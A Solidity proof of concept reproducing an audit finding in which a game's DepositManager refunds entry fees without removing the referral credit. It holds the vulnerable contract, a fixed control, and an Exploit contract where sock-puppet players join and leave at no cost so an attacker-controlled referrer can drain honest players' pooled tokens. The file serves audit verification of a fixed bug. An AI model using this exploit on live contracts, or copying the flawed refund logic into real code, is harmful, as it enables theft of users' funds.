// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Majority Protocol finding 65372:
// "DepositManager::_refundEntryFee doesn't deduct referral rewards".
//
// Real audited source (pre-fix / vulnerable state):
//   repo   github.com/Engage-Protocol/engage-protocol
//   commit 50a1e6bb3a48a6056cbf0678030be0e9424ba052~1  (parent of the fix)
//   file   src/DepositManager.sol
//
// _payEntryFee CREDITS the player's referrer on every join:
//     referralRewards[gameId][Registry(registry).referrers(player)] += pool.ticketPrice * REFERRER_FEE;
// but _refundEntryFee refunds the ticket WITHOUT decrementing that credit — the
// bug. A player can therefore join (crediting their referrer) and immediately
// leave (fully refunded, net token cost 0), while the referrer's credit stays
// inflated. The referrer then claims referral rewards that are NOT backed by any
// real net deposit, draining tokens the honest players contributed to the pool.
//
// The one-line fix (commit 50a1e6b) adds to _refundEntryFee:
//     referralRewards[gameId][Registry(registry).referrers(player)] -= pool.ticketPrice * REFERRER_FEE;
// The FIXED variant below (negative control) proves the drain vanishes with it.
//
// Both _payEntryFee and _refundEntryFee bodies below are byte-identical to the
// audited pre-fix source (only the surrounding scaffolding differs). The public
// join()/leave()/claimReferral() wrappers stand in for the SessionManager entry
// points that call these internal functions in production.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

/// @dev Minimal faithful stand-in for OpenZeppelin SafeERC20 (reverts on false).
library SafeERC20 {
    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        require(token.transfer(to, value), "safeTransfer failed");
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        require(token.transferFrom(from, to, value), "safeTransferFrom failed");
    }
}

/// @dev Minimal ERC20 double for the game's opaque payment token.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

/// @dev Minimal faithful double for the protocol Registry: player -> referrer.
///      In production `referrers` is `mapping(address => address) public`.
contract Registry {
    mapping(address player => address referrer) public referrers;

    function setReferrer(address player, address referrer) external {
        referrers[player] = referrer;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract: _payEntryFee / _refundEntryFee / _claimReferralReward
// bodies are verbatim from the audited pre-fix DepositManager.
// ─────────────────────────────────────────────────────────────────────────────
contract DepositManagerVulnerable {
    struct GamePool {
        uint256 gameId;
        uint256 ticketPrice;
        uint256 creatorFee;
        uint256 protocolFee;
        uint256 totalCollectedAmount;
        address token;
        bool feesPaid;
    }

    event ReferralRewardClaimed(
        uint256 indexed gameId, address indexed referrer, address indexed token, uint256 amount
    );

    error InsufficientBalance(address player, address token, uint256 balance, uint256 required);
    error AlreadyRefunded(address player, uint256 gameId);
    error NotEnoughFunds(address token, uint256 balance);

    mapping(uint256 gameId => GamePool pool) public gamePools;
    mapping(uint256 sessionId => mapping(address player => bool)) public hasRefunded;
    mapping(uint256 sessionId => mapping(address referrer => uint256 referralReward)) public referralRewards;

    uint256 public constant REFERRER_FEE = 200;
    uint256 public constant BASIS_POINTS = 10000;

    address public registry;
    bytes32 public constant CLAIMER_ROLE = keccak256("CLAIMER_ROLE");

    constructor(address _registry) {
        registry = _registry;
    }

    /// @dev No CLAIMER_ROLE holders in this reduction; keeps _claimReferralReward verbatim.
    function hasRole(bytes32, address) public pure returns (bool) {
        return false;
    }

    /// @notice Setup helper standing in for _createGamePool.
    function createGamePool(uint256 gameId, uint256 ticketPrice, address token) external {
        gamePools[gameId] = GamePool({
            gameId: gameId,
            ticketPrice: ticketPrice,
            creatorFee: 0,
            protocolFee: 0,
            totalCollectedAmount: 0,
            token: token,
            feesPaid: false
        });
    }

    // ── VERBATIM audited pre-fix bodies (public wrappers stand in for the
    //    SessionManager entry points that call these internals in production) ──

    function _payEntryFee(uint256 gameId, address player) internal {
        GamePool storage pool = gamePools[gameId];
        require(
            IERC20(pool.token).balanceOf(player) >= pool.ticketPrice,
            InsufficientBalance({
                player: player,
                token: pool.token,
                balance: IERC20(pool.token).balanceOf(player),
                required: pool.ticketPrice
            })
        );
        pool.totalCollectedAmount += pool.ticketPrice;
        // @> _payEntryFee CREDITS the referrer on every join (paired with the omission below):
        referralRewards[gameId][Registry(registry).referrers(player)] += pool.ticketPrice * REFERRER_FEE;
        SafeERC20.safeTransferFrom(IERC20(pool.token), player, address(this), pool.ticketPrice);
    }

    function _refundEntryFee(uint256 gameId, address player) internal {
        GamePool storage pool = gamePools[gameId];
        require(pool.totalCollectedAmount >= pool.ticketPrice, NotEnoughFunds(pool.token, pool.totalCollectedAmount));
        require(!hasRefunded[gameId][player], AlreadyRefunded(player, gameId));
        hasRefunded[gameId][player] = true;
        pool.totalCollectedAmount -= pool.ticketPrice;
        // @> VULN: _refundEntryFee never decrements referralRewards (missing: referralRewards[gameId][Registry(registry).referrers(player)] -= pool.ticketPrice * REFERRER_FEE;)
        SafeERC20.safeTransfer(IERC20(pool.token), player, pool.ticketPrice);
    }

    function _claimReferralReward(uint256 gameId) internal {
        address claimedAddress = hasRole(CLAIMER_ROLE, msg.sender) ? address(0) : msg.sender;
        uint256 referralReward = referralRewards[gameId][claimedAddress] / BASIS_POINTS;
        referralRewards[gameId][claimedAddress] = 0;
        SafeERC20.safeTransfer(IERC20(gamePools[gameId].token), msg.sender, referralReward);
        emit ReferralRewardClaimed(gameId, msg.sender, gamePools[gameId].token, referralReward);
    }

    function join(uint256 gameId, address player) external {
        _payEntryFee(gameId, player);
    }

    function leave(uint256 gameId, address player) external {
        _refundEntryFee(gameId, player);
    }

    function claimReferral(uint256 gameId) external {
        _claimReferralReward(gameId);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract (negative control): _refundEntryFee decrements referralRewards
// exactly as the real fix commit 50a1e6b does.
// ─────────────────────────────────────────────────────────────────────────────
contract DepositManagerFixed {
    struct GamePool {
        uint256 gameId;
        uint256 ticketPrice;
        uint256 creatorFee;
        uint256 protocolFee;
        uint256 totalCollectedAmount;
        address token;
        bool feesPaid;
    }

    event ReferralRewardClaimed(
        uint256 indexed gameId, address indexed referrer, address indexed token, uint256 amount
    );

    error InsufficientBalance(address player, address token, uint256 balance, uint256 required);
    error AlreadyRefunded(address player, uint256 gameId);
    error NotEnoughFunds(address token, uint256 balance);

    mapping(uint256 gameId => GamePool pool) public gamePools;
    mapping(uint256 sessionId => mapping(address player => bool)) public hasRefunded;
    mapping(uint256 sessionId => mapping(address referrer => uint256 referralReward)) public referralRewards;

    uint256 public constant REFERRER_FEE = 200;
    uint256 public constant BASIS_POINTS = 10000;

    address public registry;
    bytes32 public constant CLAIMER_ROLE = keccak256("CLAIMER_ROLE");

    constructor(address _registry) {
        registry = _registry;
    }

    function hasRole(bytes32, address) public pure returns (bool) {
        return false;
    }

    function createGamePool(uint256 gameId, uint256 ticketPrice, address token) external {
        gamePools[gameId] = GamePool({
            gameId: gameId,
            ticketPrice: ticketPrice,
            creatorFee: 0,
            protocolFee: 0,
            totalCollectedAmount: 0,
            token: token,
            feesPaid: false
        });
    }

    function _payEntryFee(uint256 gameId, address player) internal {
        GamePool storage pool = gamePools[gameId];
        require(
            IERC20(pool.token).balanceOf(player) >= pool.ticketPrice,
            InsufficientBalance({
                player: player,
                token: pool.token,
                balance: IERC20(pool.token).balanceOf(player),
                required: pool.ticketPrice
            })
        );
        pool.totalCollectedAmount += pool.ticketPrice;
        referralRewards[gameId][Registry(registry).referrers(player)] += pool.ticketPrice * REFERRER_FEE;
        SafeERC20.safeTransferFrom(IERC20(pool.token), player, address(this), pool.ticketPrice);
    }

    function _refundEntryFee(uint256 gameId, address player) internal {
        GamePool storage pool = gamePools[gameId];
        require(pool.totalCollectedAmount >= pool.ticketPrice, NotEnoughFunds(pool.token, pool.totalCollectedAmount));
        require(!hasRefunded[gameId][player], AlreadyRefunded(player, gameId));
        hasRefunded[gameId][player] = true;
        pool.totalCollectedAmount -= pool.ticketPrice;
        // FIX (commit 50a1e6b): decrement the referral credit that _payEntryFee added.
        referralRewards[gameId][Registry(registry).referrers(player)] -= pool.ticketPrice * REFERRER_FEE;
        SafeERC20.safeTransfer(IERC20(pool.token), player, pool.ticketPrice);
    }

    function _claimReferralReward(uint256 gameId) internal {
        address claimedAddress = hasRole(CLAIMER_ROLE, msg.sender) ? address(0) : msg.sender;
        uint256 referralReward = referralRewards[gameId][claimedAddress] / BASIS_POINTS;
        referralRewards[gameId][claimedAddress] = 0;
        SafeERC20.safeTransfer(IERC20(gamePools[gameId].token), msg.sender, referralReward);
        emit ReferralRewardClaimed(gameId, msg.sender, gamePools[gameId].token, referralReward);
    }

    function join(uint256 gameId, address player) external {
        _payEntryFee(gameId, player);
    }

    function leave(uint256 gameId, address player) external {
        _refundEntryFee(gameId, player);
    }

    function claimReferral(uint256 gameId) external {
        _claimReferralReward(gameId);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Helpers used to give each game participant a distinct address that holds and
// approves the payment token (a real EOA would just approve the DepositManager).
// ─────────────────────────────────────────────────────────────────────────────
contract Party {
    constructor(MiniToken token, address dm) {
        token.approve(dm, type(uint256).max);
    }
}

/// @dev Attacker-controlled referrer: claims the inflated referral rewards and
///      forwards the stolen tokens to the attacker EOA (the profit receiver).
contract Referrer {
    function claimTo(DepositManagerVulnerable dm, MiniToken token, uint256 gameId, address to) external {
        dm.claimReferral(gameId);
        token.transfer(to, token.balanceOf(address(this)));
    }

    // Same entry point for the FIXED control path.
    function claimToFixed(DepositManagerFixed dm, MiniToken token, uint256 gameId, address to) external {
        dm.claimReferral(gameId);
        token.transfer(to, token.balanceOf(address(this)));
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver.
//   Honest players deposit and STAY (funding the pool).
//   Attacker runs K sock-puppet players who each join then leave (net cost 0),
//   all pointing at one attacker-controlled referrer. The referrer then claims
//   K * ticketPrice * REFERRER_FEE / BASIS_POINTS tokens straight out of the
//   honest players' pooled funds, and forwards them to the attacker EOA.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant GAME_ID = 1;
    uint256 internal constant TICKET = 100 ether;
    uint256 internal constant N_HONEST = 3;
    uint256 internal constant K_SOCKS = 5;

    // Exposed results for the driver.
    address public dmAddr;
    address public tokenAddr;
    address public referrerAddr;
    uint256 public honestDeposits;   // real net deposits from honest players
    uint256 public poolBefore;       // dm token balance before the referrer claim
    uint256 public poolAfter;        // dm token balance after the referrer claim
    uint256 public stolenToAttacker; // tokens the attacker EOA walked away with
    uint256 public attackerCost;     // net token cost to the attacker's socks (== 0)

    function run() external payable {
        MiniToken token = new MiniToken("Majority Token", "MJT");         // deploy 0
        Registry registry = new Registry();                              // deploy 1
        DepositManagerVulnerable dm = new DepositManagerVulnerable(address(registry)); // deploy 2
        Referrer referrer = new Referrer();                              // deploy 3

        dmAddr = address(dm);
        tokenAddr = address(token);
        referrerAddr = address(referrer);

        dm.createGamePool(GAME_ID, TICKET, address(token));

        // --- honest players fund the pool and stay ---
        for (uint256 i = 0; i < N_HONEST; i++) {
            Party honest = new Party(token, address(dm));                 // deploys 4..(4+N_HONEST-1)
            token.mint(address(honest), TICKET);
            dm.join(GAME_ID, address(honest));
        }
        honestDeposits = N_HONEST * TICKET;

        // --- attacker's sock-puppets: join then leave, all sharing one referrer ---
        uint256 socksFundedTotal = K_SOCKS * TICKET;
        uint256 socksHeldAfter = 0;
        for (uint256 i = 0; i < K_SOCKS; i++) {
            Party sock = new Party(token, address(dm));                   // deploys after honest players
            token.mint(address(sock), TICKET);
            registry.setReferrer(address(sock), address(referrer));       // sock's referrer = attacker
            dm.join(GAME_ID, address(sock));                              // credits referrer, pulls TICKET
            dm.leave(GAME_ID, address(sock));                            // refunds TICKET, credit stays (bug)
            socksHeldAfter += token.balanceOf(address(sock));
        }
        // Each sock paid TICKET then got TICKET back -> net token cost 0.
        attackerCost = socksFundedTotal - socksHeldAfter;

        // --- the inflated, unbacked referral credit is claimed out of the pool ---
        poolBefore = token.balanceOf(address(dm));
        referrer.claimTo(dm, token, GAME_ID, ATTACKER);
        poolAfter = token.balanceOf(address(dm));

        stolenToAttacker = token.balanceOf(ATTACKER);

        // ── HARM (concrete, numeric) ──
        // 1. The attacker EOA extracted real tokens it never net-deposited.
        uint256 expectedStolen = K_SOCKS * TICKET * dm.REFERRER_FEE() / dm.BASIS_POINTS();
        require(stolenToAttacker == expectedStolen, "attacker did not extract expected amount");
        require(stolenToAttacker > 0, "no theft");
        // 2. Socks cost the attacker nothing -> pure profit.
        require(attackerCost == 0, "attacker sock cost should be zero");
        // 3. The stolen tokens came straight out of the honest players' pool.
        require(poolAfter == poolBefore - stolenToAttacker, "pool not drained by claim");
        // 4. Pool can no longer cover the honest players' deposits -> insolvent for winners.
        require(poolAfter < honestDeposits, "pool still solvent");
    }
}
